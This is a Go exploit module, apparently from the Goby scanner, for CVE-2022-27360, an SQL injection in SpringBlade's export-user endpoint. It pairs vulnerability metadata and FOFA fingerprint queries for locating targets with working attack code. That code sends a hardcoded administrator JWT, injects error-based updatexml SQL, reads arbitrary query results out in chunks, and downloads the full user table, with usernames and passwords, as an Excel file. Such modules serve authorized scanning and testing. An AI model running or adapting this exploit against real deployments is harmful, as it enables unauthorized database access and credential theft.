package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math"
	"math/rand"
	"net/url"
	"regexp"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SpringBlade export-user path SQL injection vulnerability (CVE-2022-27360)",
    "Description": "<p>SpringBlade is a comprehensive project that combines the SpringCloud distributed microservices architecture and the SpringBoot monolithic microservices architecture, which were upgraded and optimized from commercial level projects.</p><p>There is a security vulnerability in the backend export user path of the SpringBlade v3.2.0 and earlier frameworks, which can be exploited by attackers to conduct SQL injection attacks through the customSqlSegment component. Attackers can export sensitive information such as usernames and passwords through Excel.</p>",
    "Impact": "<p>Attackers can use this vulnerability to execute malicious SQL statements, query database content, and export sensitive information such as usernames and passwords through Excel.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/chillzhuang/blade-tool\">https://github.com/chillzhuang/blade-tool</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Saber-EDEV-Platform",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "SpringBlade export-user 路径 SQL 注入漏洞 （CVE-2022-27360）",
            "Product": "Saber企业级开发平台",
            "Description": "<p>SpringBlade 是一个由商业级项目升级优化而来的 SpringCloud 分布式微服务架构、SpringBoot 单体式微服务架构并存的综合型项目。</p><p>SpringBlade v3.2.0 及之前版本框架后台 export-user 路径存在安全漏洞，攻击者利用该漏洞可通过组件customSqlSegment 进行SQL注入攻击，攻击者可将用户名、密码等敏感信息通过 excel 导出。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/chillzhuang/blade-tool\">https://github.com/chillzhuang/blade-tool</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞执行恶意SQL语句，查询数据库内容，还可将用户名、密码等敏感信息通过excel导出。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "SpringBlade export-user path SQL injection vulnerability (CVE-2022-27360)",
            "Product": "Saber-EDEV-Platform",
            "Description": "<p>SpringBlade is a comprehensive project that combines the SpringCloud distributed microservices architecture and the SpringBoot monolithic microservices architecture, which were upgraded and optimized from commercial level projects.</p><p>There is a security vulnerability in the backend export user path of the SpringBlade v3.2.0 and earlier frameworks, which can be exploited by attackers to conduct SQL injection attacks through the customSqlSegment component. Attackers can export sensitive information such as usernames and passwords through Excel.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/chillzhuang/blade-tool\">https://github.com/chillzhuang/blade-tool</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to execute malicious SQL statements, query database content, and export sensitive information such as usernames and passwords through Excel.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "body=\"saber/iconfont.css\" || body=\"Saber 将不能正常工作\" || title=\"Sword Admin\" || body=\"We're sorry but avue-data doesn't work\" || title=\"Saber企业级开发平台\"",
    "GobyQuery": "body=\"saber/iconfont.css\" || body=\"Saber 将不能正常工作\" || title=\"Sword Admin\" || body=\"We're sorry but avue-data doesn't work\" || title=\"Saber企业级开发平台\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://github.com/chillzhuang/blade-tool",
    "DisclosureDate": "2022-03-14",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "6.0",
    "CVEIDs": [
        "CVE-2022-27360"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202205-2505"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint,exportUser",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select user()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PostTime": "2023-12-14",
    "CVSSScore": "9.8",
    "PocId": "10261"
}`

	sendPayload3fd4refgew1 := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewGetRequestConfig("/api/blade-user/export-user?Blade-Auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ&account=&realName=&1-updatexml(1,concat(0x7e,(" + url.QueryEscape(sql) + "),0x7e),1)=1")
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}

	ergodicSqlData8se35erfedf := func(hostInfo *httpclient.FixUrl, sql string) (string, error) {
		resp, err := sendPayload3fd4refgew1(hostInfo, sql)
		if resp == nil && err != nil {
			return "", err
		} else if resp != nil && strings.Contains(resp.Utf8Html, `XPATH syntax error`) && resp.StatusCode == 500 {
			position := 0
			var resultAll string
			if resp, err := sendPayload3fd4refgew1(hostInfo, fmt.Sprintf("length((%s))", sql)); err == nil && strings.Contains(resp.Utf8Html, "nested exception is java.sql.SQLException: XPATH syntax error: '~") {
				result := regexp.MustCompile(`nested exception is java.sql.SQLException: XPATH syntax error: '~(.*?)'`).FindStringSubmatch(resp.Utf8Html)
				if len(result) > 1 {
					num, _ := strconv.ParseFloat(strings.TrimRight(result[1], "~"), 1)
					several := math.Round(num/28 + 0.5)
					for i := 0; i < int(math.Round(several)); i += 1 {
						if resp, err := sendPayload3fd4refgew1(hostInfo, fmt.Sprintf("substr((%s),%s,%s)", sql, strconv.Itoa(position+1), "28")); err == nil && strings.Contains(resp.Utf8Html, "nested exception is java.sql.SQLException: XPATH syntax error: '~") {
							result := regexp.MustCompile(`nested exception is java.sql.SQLException: XPATH syntax error: '~(.*?)'`).FindStringSubmatch(resp.Utf8Html)
							if len(result) > 1 {
								resultAll += strings.TrimRight(result[1], "~")
							} else {
								break
							}
						}
						position += 28
					}

				}
			}
			return resultAll, nil
		}
		return "", errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := []byte(fmt.Sprintf("%d", rand.Intn(100)))
			h := md5.New()
			h.Write(checkStr)
			result, _ := ergodicSqlData8se35erfedf(hostInfo, `md5('`+string(checkStr)+`')`)
			return strings.Contains(result, hex.EncodeToString(h.Sum(nil)))
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "sql" {
				result, err := ergodicSqlData8se35erfedf(expResult.HostInfo, goutils.B2S(ss.Params["sql"]))
				if err == nil && len(result) > 0 {
					expResult.Success = true
					expResult.Output = result
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "sqlPoint" {
				checkStr := []byte(fmt.Sprintf("%d", rand.Intn(100)))
				h := md5.New()
				h.Write(checkStr)
				result, err := ergodicSqlData8se35erfedf(expResult.HostInfo, `md5('`+string(checkStr)+`')`)
				if strings.Contains(result, hex.EncodeToString(h.Sum(nil))) {
					expResult.Output = "GET /api/blade-user/export-user?Blade-Auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ&account=&realName=&1-updatexml(1,concat(0x5c,md5(" + string(checkStr) + "),0x5c),1)=1 HTTP/1.1\n" +
						"Host:" + expResult.HostInfo.String() + "\n" +
						"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\n"
					expResult.Success = true
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "exportUser" {
				uri := "/api/blade-user/export-user?Blade-Auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ&account=&realName=&-1=1"
				cfg := httpclient.NewGetRequestConfig(uri)
				cfg.FollowRedirect = false
				cfg.VerifyTls = false
				resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
				if resp != nil && resp.StatusCode == 200 && strings.Contains(resp.HeaderString.String(), ".xlsx") && strings.Contains(resp.HeaderString.String(), "filename=") {
					expResult.Success = true
					expResult.Output = "URL: " + expResult.HostInfo.String() + uri
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
